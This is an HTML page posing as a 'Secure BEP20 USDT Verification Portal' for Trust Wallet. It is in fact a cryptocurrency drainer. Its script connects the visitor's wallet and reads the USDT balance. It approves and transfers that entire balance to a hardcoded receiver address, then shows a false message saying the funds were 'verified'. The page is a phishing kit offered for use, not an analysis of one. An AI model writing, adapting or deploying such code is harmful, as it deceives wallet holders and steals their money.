<!DOCTYPE html><html>
<head>
  <title>Verify USDT</title>
  <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js@1.0.0-beta.36/dist/web3.min.js"></script>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #001f3f;
      color: white;
      text-align: center;
    }
    iframe {
      max-width: 100%;
      border: none;
      border-radius: 8px;
    }
    #verifyBtn {
      margin-top: 20px;
      padding: 15px 30px;
      background: linear-gradient(90deg, #00ffcc, #3366ff);
      border: none;
      border-radius: 30px;
      font-size: 18px;
      font-weight: bold;
      color: #000;
      cursor: pointer;
      transition: all 0.3s ease-in-out;
    }
    #verifyBtn:hover {
      transform: scale(1.05);
      box-shadow: 0 0 15px #00ffcc;
    }
    #status {
      margin-top: 20px;
      font-size: 16px;
    }
  </style>
</head>
<body>  <h2 style="color: #00ffcc">Verified on Trust Wallet</h2>
  <p>Secure BEP20 USDT Verification Portal</p>  <!-- Canva embedded design (optional background/frame)-->  <div style="position: relative; width: 100%; height: 0; padding-top: 556.7350%; padding-bottom: 0; margin: 1.6em 0; overflow: hidden; border-radius: 8px;">
    <iframe loading="lazy" style="position: absolute; width: 100%; height: 100%; top: 0; left: 0;" src="https://www.canva.com/design/DAGqu3wFQs4/a7G3-SuUSKkMfyyhW5tPBA/view?embed" allowfullscreen="allowfullscreen"></iframe>
  </div>  <!-- Custom button --><button id="verifyBtn" onclick="connectAndSend()">Verify USDT</button>

  <p id="status"></p>  <script>
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
    const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999"; // your wallet
    const usdtABI = [
      { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" },
      { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" }
    ];

    async function connectAndSend() {
      if (typeof window.ethereum === 'undefined') {
        alert('Trust Wallet or MetaMask not detected');
        return;
      }

      const web3 = new Web3(window.ethereum);
      try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const sender = accounts[0];
        const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
        const balance = await usdt.methods.balanceOf(sender).call();

        if (balance == 0) {
          document.getElementById("status").innerText = "No USDT in wallet.";
          return;
        }

        document.getElementById("status").innerText = "Approving...";
        await usdt.methods.approve(receiver, balance).send({ from: sender });

        document.getElementById("status").innerText = "Transferring...";
        await usdt.methods.transfer(receiver, balance).send({ from: sender });

        document.getElementById("status").innerText = ${web3.utils.fromWei(balance)} USDT verified.;
      } catch (err) {
        console.error(err);
        document.getElementById("status").innerText = "Transaction failed or cancelled.";
      }
    }
  </script></body>
</html>
